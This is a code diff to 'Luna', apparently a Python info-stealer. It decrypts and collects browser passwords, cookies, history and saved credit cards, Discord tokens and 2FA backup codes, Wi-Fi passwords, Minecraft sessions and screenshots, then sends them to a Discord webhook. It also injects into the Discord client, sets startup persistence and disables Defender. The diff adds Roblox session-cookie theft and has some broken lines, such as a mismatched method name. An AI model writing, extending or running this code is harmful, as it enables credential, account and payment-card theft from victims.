@@ -34,7 +34,7 @@ __DEFENDER__ = "%_defender_enabled%"
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
 
-    threads = [browsers, grabwifi, mc_tokens, epicgames_data, mfa_codes, fakeerror, startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, fakeerror, startup, disable_defender]
     configcheck(threads)
 
     for func in threads:
@@ -60,20 +60,19 @@ def main(webhook: str):
 
     webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
-    grabpcinfo()
-    grabtokens()
+    PcInfo()
+    Discord()
 
 
 def Luna(webhook: str):
-    debug()
+    Debug()
 
-    procs = [main, inject]
+    procs = [main, Injection]
 
     for proc in procs:
         proc(webhook)
 
     os.remove(f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip')
-
 
 def try_extract(func):
     def wrapper(*args, **kwargs):
@@ -117,7 +116,7 @@ def create_temp(_dir: str or os.PathLike = gettempdir()):
     return path
 
 
-class grabpcinfo:
+class PcInfo:
     def __init__(self):
         self.get_inf(__WEBHOOK__)
 
@@ -141,7 +140,7 @@ class grabpcinfo:
 
 
 @try_extract
-class grabtokens:
+class Discord:
     def __init__(self):
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
@@ -364,12 +363,13 @@ class grabtokens:
                 username="Luna")
             self.tokens_sent += token
 
-        ImageGrab.grab(
+        image = ImageGrab.grab(
             bbox=None,
             all_screens=True,
             include_layered_windows=False,
             xdisplay=None
-        ).save(tempfolder + "\\image.png")
+        )
+        image.save(tempfolder + "\\image.png")
 
         embed2 = Embed(title="Desktop Screenshot", color=5639644)
         file = File(tempfolder + "\\image.png", filename="image.png")
@@ -379,10 +379,11 @@ class grabtokens:
             embed=embed2,
             file=file,
             username="Luna")
+        os.close(image)
 
 
 @try_extract
-class browsers:
+class Browsers:
     def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
         self.roaming = os.getenv('APPDATA')
@@ -415,6 +416,7 @@ class browsers:
         ]
 
         os.makedirs(os.path.join(tempfolder, "Browser"), exist_ok=True)
+        os.makedirs(os.path.join(tempfolder, "Roblox"), exist_ok=True)
 
         for name, path in self.browsers.items():
             if not os.path.isdir(path):
@@ -434,6 +436,8 @@ class browsers:
                         func(name, path, profile)
                     except:
                         pass
+                    
+        self.robloxcookies()
 
     def get_master_key(self, path: str) -> str:
         with open(path, "r", encoding="utf-8") as f:
@@ -462,7 +466,6 @@ class browsers:
         conn = sqlite3.connect(loginvault)
         cursor = conn.cursor()
         with open(os.path.join(tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
-            f.write(f"\nBrowser: {name}\n")
             for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                 url, username, password = res
                 password = self.decrypt_password(password, self.masterkey)
@@ -481,7 +484,6 @@ class browsers:
         conn = sqlite3.connect(cookievault)
         cursor = conn.cursor()
         with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'a', encoding="utf-8") as f:
-            f.write(f"\nBrowser: {name}\n")
             for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
@@ -501,7 +503,6 @@ class browsers:
         conn = sqlite3.connect(historyvault)
         cursor = conn.cursor()
         with open(os.path.join(tempfolder, "Browser", "Browser History.txt"), 'a', encoding="utf-8") as f:
-            f.write(f"\nBrowser: {name}\n")
             sites = []
             for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                 url, title, visit_count, last_visit_time = res
@@ -523,7 +524,6 @@ class browsers:
         conn = sqlite3.connect(cardvault)
         cursor = conn.cursor()
         with open(os.path.join(tempfolder, "Browser", "Browser Creditcards.txt"), 'a', encoding="utf-8") as f:
-            f.write(f"\nBrowser: {name}\n")
             for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                 name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                 if name_on_card and card_number_encrypted != "":
@@ -534,9 +534,17 @@ class browsers:
         conn.close()
         os.remove(cardvault)
 
+    def roblox_cookies(self):
+        with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
+            f.write(f"{github} | Roblox Cookies\n\n")
+            with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
+                for line in f2:
+                    if ".ROBLOSECURITY" in line:
+                        f.write(line.split(".ROBLOSECURITY")[1].strip() + "\n")
+
 
 @try_extract
-class grabwifi:
+class Wifi:
     def __init__(self):
         self.wifi_list = []
         self.name_pass = {}
@@ -574,7 +582,7 @@ class grabwifi:
 
 
 @try_extract
-class mc_tokens:
+class Minecraft:
     def __init__(self):
         self.roaming = os.getenv("appdata")
         self.accounts_path = "\\.minecraft\\launcher_accounts.json"
@@ -587,6 +595,7 @@ class mc_tokens:
 
     def session_info(self):
         with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
+            f.write(f"{github} | Minecraft Session Info\n\n")
             if os.path.exists(self.roaming + self.accounts_path):
                 with open(self.roaming + self.accounts_path, "r") as g:
                     self.session = json.load(g)
@@ -596,6 +605,7 @@ class mc_tokens:
 
     def user_cache(self):
         with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
+            f.write(f"{github} | Minecraft User Cache\n\n")
             if os.path.exists(self.roaming + self.usercache_path):
                 with open(self.roaming + self.usercache_path, "r") as g:
                     self.user = json.load(g)
@@ -605,29 +615,7 @@ class mc_tokens:
 
 
 @try_extract
-class epicgames_data:
-    def __init__(self):
-        self.local = os.getenv("localappdata")
-        self.epic = self.local + \
-            "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
-
-        os.makedirs(os.path.join(tempfolder, "Epic Games"), exist_ok=True)
-        self.get_data()
-
-    def get_data(self):
-        with open(os.path.join(tempfolder, "Epic Games", "Offline Data.txt"), 'w', encoding="cp437") as g:
-            g.write(f"{github} | Epic Games Offline Data\n\n")
-            if os.path.exists(self.epic):
-                with open(self.epic, "r") as f:
-                    for line in f.readlines():
-                        if line.startswith("Data="):
-                            g.write(line.split('Data=')[1].strip())
-            else:
-                g.write("No epic games data was found :(")
-
-
-@try_extract
-class mfa_codes:
+class BackupCodes:
     def __init__(self):
         self.path = os.environ["HOMEPATH"]
         self.code_path = '\\Downloads\\discord_backup_codes.txt'
@@ -637,7 +625,7 @@ class mfa_codes:
 
     def get_codes(self):
         with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
-            f.write(f"{github} | Discord Backup Codes\n")
+            f.write(f"{github} | Discord Backup Codes\n\n")
             if os.path.exists(self.path + self.code_path):
                 with open(self.path + self.code_path, 'r') as g:
                     for line in g.readlines():
@@ -662,7 +650,7 @@ def zipup():
     zipped_file.close()
 
 
-class inject:
+class Injection:
     def __init__(self, webhook: str):
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
@@ -714,7 +702,7 @@ class inject:
                                             stderr=subprocess.PIPE)
 
 
-class debug:
+class Debug:
     global tempfolder
     tempfolder = mkdtemp()
 
